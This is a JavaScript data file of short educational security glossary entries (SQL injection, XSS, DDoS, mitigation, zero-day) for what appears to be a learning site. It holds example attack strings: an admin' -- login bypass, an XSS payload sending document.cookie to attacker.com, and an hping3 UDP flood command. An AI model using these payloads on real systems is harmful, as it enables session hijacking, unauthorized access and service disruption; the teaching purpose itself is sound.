export const articles = [
  {
    id: "sql-injection",
    slug: "sql-injection",
    title: "SQL Injection (SQLi)",
    category: "Offensive",
    tags: ["Offensive", "Web Application", "OWASP Top 10"],
    lastUpdated: "Oct 24, 2024",
    contributor: "sec_ops_99",
    summary:
      "SQL Injection (SQLi) is a code injection technique that might destroy your database. It is one of the most common web hacking techniques. SQL injection occurs when malicious SQL statements are inserted into entry fields for execution.",
    body: `SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed.`,
    practicalExample: {
      description: "Consider a typical authentication query that looks like this in the backend:",
      codeVulnerable: "SELECT * FROM Users WHERE Username='$username' AND Password='$password'",
      explanation: "If an attacker inputs admin' -- into the username field, the query becomes:",
      codeExploited: "SELECT * FROM Users WHERE Username='admin' --' AND Password='$password'",
      result: "The -- sequence comments out the rest of the query, effectively bypassing the password check and logging the attacker in as 'admin'.",
    },
    relatedVectors: ["Blind SQLi", "Cross-Site Scripting (XSS)", "Command Injection"],
    analysisTools: [
      { name: "SQLMap", description: "Automated SQL injection and database takeover tool." },
      { name: "Burp Suite", description: "Intercepting proxy to modify requests manually." },
    ],
  },
  {
    id: "xss",
    slug: "xss",
    title: "Cross-Site Scripting (XSS)",
    category: "Offensive",
    tags: ["Offensive", "Web Application", "OWASP Top 10"],
    lastUpdated: "Nov 10, 2024",
    contributor: "redteam_x",
    summary:
      "Cross-Site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application.",
    body: `XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.`,
    practicalExample: {
      description: "A reflected XSS attack in a search field:",
      codeVulnerable: '<script>alert("XSS")</script>',
      explanation: "When the server echoes user input without sanitization, the script executes in the victim's browser.",
      codeExploited: 'https://example.com/search?q=<script>document.location="http://attacker.com/?c="+document.cookie</script>',
      result: "The victim's cookies are sent to the attacker's server, enabling session hijacking.",
    },
    relatedVectors: ["SQL Injection (SQLi)", "CSRF", "Command Injection"],
    analysisTools: [
      { name: "Burp Suite", description: "Intercepting proxy to test XSS payloads." },
      { name: "XSStrike", description: "Advanced XSS detection suite." },
    ],
  },
  {
    id: "ddos",
    slug: "ddos",
    title: "DDoS Attack",
    category: "Offensive",
    tags: ["Offensive", "Network", "Infrastructure"],
    lastUpdated: "Dec 5, 2024",
    contributor: "netops_77",
    summary:
      "A Distributed Denial of Service (DDoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service or network by overwhelming the target with a flood of Internet traffic.",
    body: `DDoS attacks are effective because they use multiple compromised computer systems as sources of attack traffic. Exploited machines can include computers and other networked resources such as IoT devices.`,
    practicalExample: {
      description: "A volumetric DDoS attack pattern:",
      codeVulnerable: "Attacker → Botnet (10,000 nodes) → Target Server",
      explanation: "Each bot sends 1 Mbps, resulting in 10 Gbps of traffic hitting the target.",
      codeExploited: "UDP Flood: hping3 --udp -p 80 --flood target.com",
      result: "The target server becomes overwhelmed and legitimate users cannot access the service.",
    },
    relatedVectors: ["Mitigation", "Traffic Scrubbing", "Rate Limiting"],
    analysisTools: [
      { name: "Wireshark", description: "Network protocol analyzer." },
      { name: "Cloudflare", description: "DDoS protection and mitigation service." },
    ],
  },
  {
    id: "mitigation",
    slug: "mitigation",
    title: "Mitigation",
    category: "Defensive",
    tags: ["Defense", "DEFENSE-TECH", "Active"],
    lastUpdated: "Jan 15, 2025",
    contributor: "blue_ops_42",
    summary:
      "The systematic process of reducing or eliminating the impact of cyber threats through proactive infrastructure design and reactive response protocols.",
    body: `In the context of cybersecurity, mitigation strategies aim to neutralize attacks like DDoS before they can saturate bandwidth or exploit server resources.`,
    practicalExample: {
      description: "Key mitigation concepts:",
      codeVulnerable: "No protection → Direct attack hits server",
      explanation: "With mitigation layers in place:",
      codeExploited: "Attack → Anycast Network → Traffic Scrubbing → Rate Limiting → Clean Traffic → Server",
      result: "Malicious traffic is filtered out and only legitimate requests reach the server.",
    },
    relatedVectors: ["Traffic Scrubbing", "Rate Limiting", "Anycast Network", "DDoS Defense"],
    analysisTools: [
      { name: "Cloudflare", description: "Global anycast network for DDoS mitigation." },
      { name: "AWS Shield", description: "Managed DDoS protection service." },
    ],
  },
  {
    id: "zero-day",
    slug: "zero-day",
    title: "Zero-Day Vulnerability",
    category: "Offensive",
    tags: ["Offensive", "Vulnerability", "Critical"],
    lastUpdated: "Feb 1, 2025",
    contributor: "vuln_hunter",
    summary:
      "A software vulnerability that is discovered by attackers before the vendor has become aware of it. Because the developers have had 'zero days' to fix it, these exploits pose a severe and immediate threat to systems.",
    body: `Zero-day vulnerabilities are particularly dangerous because no patch exists at the time of discovery. Attackers can exploit these flaws freely until the vendor releases a fix.`,
    practicalExample: {
      description: "Zero-day exploitation lifecycle:",
      codeVulnerable: "Vulnerability exists in software → Unknown to vendor",
      explanation: "Attacker discovers and weaponizes the vulnerability:",
      codeExploited: "Attacker finds bug → Creates exploit → Deploys before patch → Vendor notified → Patch released",
      result: "Organizations with unpatched systems remain vulnerable even after disclosure.",
    },
    relatedVectors: ["SQL Injection (SQLi)", "Buffer Overflow", "Remote Code Execution"],
    analysisTools: [
      { name: "Shodan", description: "Search engine for internet-connected devices." },
      { name: "Metasploit", description: "Penetration testing framework." },
    ],
  },
];

export const offenseArticles = articles.filter(a => a.category === "Offensive");
export const defenseArticles = articles.filter(a => a.category === "Defensive");

export const termNodes = [
  { id: "mitigation", label: "Mitigation", status: "ACTIVE", related: ["traffic-scrubbing", "rate-limiting", "ddos-defense", "anycast"] },
  { id: "traffic-scrubbing", label: "Traffic Scrubbing", related: ["mitigation"] },
  { id: "rate-limiting", label: "Rate Limiting", related: ["mitigation"] },
  { id: "ddos-defense", label: "DDoS Defense", related: ["mitigation"] },
  { id: "anycast", label: "Anycast Network", related: ["mitigation"] },
];
